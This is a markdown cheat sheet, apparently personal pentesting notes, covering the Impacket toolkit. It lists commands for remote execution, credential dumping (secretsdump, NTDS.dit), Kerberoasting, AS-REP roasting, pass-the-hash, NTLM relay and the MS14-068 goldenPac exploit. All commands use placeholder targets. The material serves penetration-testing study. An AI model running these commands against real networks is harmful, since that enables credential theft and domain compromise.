---
id: Impacket
aliases: []
tags:
  - Networking/Tools/Impacket
links: "[[Networking/Tools/Tools]]"
---

# Impacket

[Impacket](https://github.com/fortra/impacket)
is a collection of Python classes for working with network protocols
(*developed by [Core Security](https://www.coresecurity.com/)*)

___

<!-- Install {{{-->
## Install

[Kali - impacket-scripts](https://www.kali.org/tools/impacket-scripts/)
— Standalone command line tools

```sh
sudo apt install impacket-scripts
```

[Kali - impacket](https://www.kali.org/tools/impacket/)
— Python library package

```sh
sudo apt install python3-impacket
```
___
<!-- }}} -->

<!-- Usage {{{-->
## Usage

Help and Usage Information

<!-- Info {{{-->
> [!info]-
>
> This command displays help information for specific Impacket tools,
> showing available options and usage examples
>
<!-- }}} -->

```sh
<tool>.py -h
```

```sh
<tool>.py --help
```

[PSExec](https://github.com/fortra/impacket/blob/master/examples/psexec.py) -
Remote Command Execution

<!-- Info {{{-->
> [!info]-
>
> This command provides remote command execution similar to Microsoft's PSExec tool.
> It uploads and executes a service binary on the target system.
>
<!-- }}} -->

```sh
impacket-psexecy <domain>/<username>:<password>@$target
```

[SMBExec](https://github.com/fortra/impacket/blob/master/examples/smbexec.py) -
Stealthier Remote Execution

<!-- Info {{{-->
> [!info]-
>
> This command executes commands remotely without writing files to disk,
> using only native Windows commands and services for stealthier operations
>
<!-- }}} -->

```sh
impacket-smbexec <domain>/<username>:<password>@$target
```

[WMIExec](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) -
WMI-Based Execution

<!-- Info {{{-->
> [!info]-
>
> This command leverages Windows Management Instrumentation (WMI)
> for remote command execution, providing another method
> for achieving code execution
>
<!-- }}} -->

```sh
impacket-wmiexec <domain>/<username>:<password>@$target
```

[DComExec](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py) -
DCOM-Based Execution

<!-- Info {{{-->
> [!info]-
>
> This command uses DCOM (Distributed Component Object Model)
> for remote execution, exploiting various DCOM applications
> for command execution
>
<!-- }}} -->

```sh
impacket-dcomexec <domain>/<username>:<password>@$target
```

[AtExec](https://github.com/fortra/impacket/blob/master/examples/atexec.py) -
Scheduled Task Execution

<!-- Info {{{-->
> [!info]-
>
> This command executes commands via Windows Task Scheduler,
> creating and executing scheduled tasks remotely for one-time command execution
>
<!-- }}} -->

```sh
impacket-atexec <domain>/<username>:<password>@$target "command"
```

[Secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) -
Credential Extraction

<!-- Info {{{-->
> [!info]-
>
> This command dumps credentials from Windows systems including SAM hashes,
> LSA secrets, cached credentials, and NTDS.dit from domain controllers
>
<!-- }}} -->

```sh
impacket-secretsdump <domain>/<username>:<password>@$target
```

[Secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) -
Secretsdump with NTDS.dit

<!-- Info {{{-->
> [!info]-
>
> This command extracts all domain credentials
> from a domain controller's NTDS.dit database,
> providing complete Active Directory password hashes
>
<!-- }}} -->

```sh
impacket-secretsdump -just-dc <domain>/<username>:<password>@<dc_ip>
```

[GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) -
AS-REP Roasting

<!-- Info {{{-->
> [!info]-
>
> This command identifies and extracts Kerberos AS-REP hashes for users
> with "Do not require Kerberos preauthentication" enabled
>
<!-- }}} -->

```sh
impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

[GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) -
Kerberoasting

<!-- Info {{{-->
> [!info]-
>
> This command requests service tickets for accounts with Service Principal Names,
> enabling offline password cracking of service account passwords
>
<!-- }}} -->

```sh
impacket-GetUserSPNs <domain>/<username>:<password> -request -outputfile hashes.txt
```

[GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) -
Get user SPNs with hash

<!-- Info {{{-->
> [!info]-
>
> This command performs Kerberoasting using NTLM hash instead of password
> for authentication, useful for pass-the-hash scenarios
>
<!-- }}} -->

```sh
impacket-GetUserSPNs -hashes <lm_hash>:<nt_hash> <domain>/<username>@<dc_ip> -request
```

[TicketConverter](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) -
Ticket Format Conversion

<!-- Info {{{-->
> [!info]-
>
> This command converts Kerberos tickets between different formats
> (ccache to kirbi and vice versa) for use with different tools
>
<!-- }}} -->

```sh
impacket-ticketConverter <ticket_file> <output_file>
```

[GetTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) -
Request Kerberos TGT

<!-- Info {{{-->
> [!info]-
>
> This command requests a Kerberos Ticket Granting Ticket (TGT)
> using credentials or hashes, useful for pass-the-ticket attacks.
>
<!-- }}} -->

```sh
impacket-getTGT <domain>/<username>:<password>
```

[GetST](https://github.com/fortra/impacket/blob/master/examples/getST.py) -
Request Service Ticket

<!-- Info {{{-->
> [!info]-
>
> This command requests specific service tickets using a TGT,
> enabling access to specific services with stolen or forged tickets.
>
<!-- }}} -->

```sh
impacket-getST -spn <service>/$target -impersonate <user> <domain>/<username>:<password>
```

[GoldenPAC](https://github.com/fortra/impacket/blob/master/examples/goldenPac.py) -
[MS14-068](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068)
Exploitation

<!-- Info {{{-->
> [!info]-
>
> This command exploits the MS14-068 vulnerability
> to gain domain admin privileges by forging Kerberos tickets with elevated privileges
>
<!-- }}} -->

```sh
impacket-goldenPac <domain>/<username>:<password>@$target
```

[SMBClient](https://github.com/fortra/impacket/blob/master/examples/smbclient.py) -
Interactive SMB Shell

<!-- Info {{{-->
> [!info]-
>
> This command provides an interactive SMB client for browsing shares,
> uploading/downloading files, and executing commands on remote systems
>
<!-- }}} -->

```sh
impacket-smbclient <domain>/<username>:<password>@$target
```

[SMBServer](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) -
Host SMB Share

<!-- Info {{{-->
> [!info]-
>
> This command creates an SMB server to host files for exfiltration or
> to provide files to target systems during exploitation.
>
<!-- }}} -->

```sh
impacket-smbserver <share_name> <directory_path>
```

[Lookupsid](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) -
SID Enumeration

<!-- Info {{{-->
> [!info]-
>
> This command enumerates users and groups by bruteforcing SIDs (Security Identifiers),
> useful for user enumeration when other methods are restricted
>
<!-- }}} -->

```sh
impacket-lookupsid <domain>/<username>:<password>@$target
```

[Reg](https://github.com/fortra/impacket/blob/master/examples/reg.py) -
Remote Registry Access

<!-- Info {{{-->
> [!info]-
>
> This command provides remote registry access
> for querying and modifying registry keys on target Windows systems
>
<!-- }}} -->

```sh
impacket-reg <domain>/<username>:<password>@$target <query/add/delete> <key>
```

[Services](https://github.com/fortra/impacket/blob/master/examples/services.py) -
Service Management

<!-- Info {{{-->
> [!info]-
>
> This command manages Windows services remotely,
> allowing creation, modification, starting, and stopping of services
> for persistence or execution
>
<!-- }}} -->

```sh
impacket-services <domain>/<username>:<password>@$target <list/create/start/stop/delete>
```

[NTLM Relay](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) -
NTLM Relay Attack

<!-- Info {{{-->
> [!info]-
>
> This command performs NTLM relay attacks,
> intercepting and relaying authentication attempts to target systems
> for unauthorized access
>
<!-- }}} -->

```sh
impacket-ntlmrelayx -t $target -smb2support
```

[GetADUsers](https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py) -
Enumerate AD Users

<!-- Info {{{-->
> [!info]-
>
> This command enumerates Active Directory users through LDAP queries,
> gathering usernames, email addresses, and other user attributes
>
<!-- }}} -->

```sh
impacket-GetADUsers -all <domain>/<username>:<password> -dc-ip <dc_ip>
```

___
<!-- }}} -->
